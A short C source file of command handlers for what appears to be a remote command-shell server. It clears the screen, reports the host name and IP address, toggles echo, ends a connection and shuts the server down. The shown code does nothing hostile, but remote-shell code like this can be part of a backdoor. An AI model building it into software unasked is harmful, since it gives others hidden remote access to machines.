#include "defines.h"
#include "macros.h"
#include "types.h"

#include "globals.h"
#include "server.h"


int zXcmd_cls(pCommandData X)
{
	/*lstrcpy(X->sbuf,"\x1B[2J");*/
	_send(X->C->S,"\x1B[2J\r\n",4,0);
	return 0;
}

int zXcmd_hi(pCommandData X)
{
#define command		X->argv[0]
	_gethostname(g_hostName,MaxHostNameLen);h_this=_gethostbyname(g_hostName);
	wsprintf(X->sbuf,"*:%s| hello! this is server: " zXver " at \"%s\" [%s]",command,g_hostName,ip2a(*(h_this->h_addr_list[0])));
    sendStr(X);
	return 0;
}

int zXcmd_eo(pCommandData X)
{
	X->C->echo=!X->C->echo;
	return 0;
}

int zXcmd_qt(pCommandData X)
{
#define command		X->argv[0]
	wsprintf(X->sbuf,"#:%s| bye! terminating connection ...",command);
	sendStr(X);
	thread(closeConnection,X->C->N);
	return 0;
}

int zXcmd_zX(pCommandData X)
{
#define command		X->argv[0]
	wsprintf(X->sbuf,"#:%s| shutting down server ...",command);
	sendStr(X);
	wsprintf(g_buf,"\r\n#:%s| bye! server shut down ...",command);
	thread(zXshutDown,g_buf);
	return 0;
}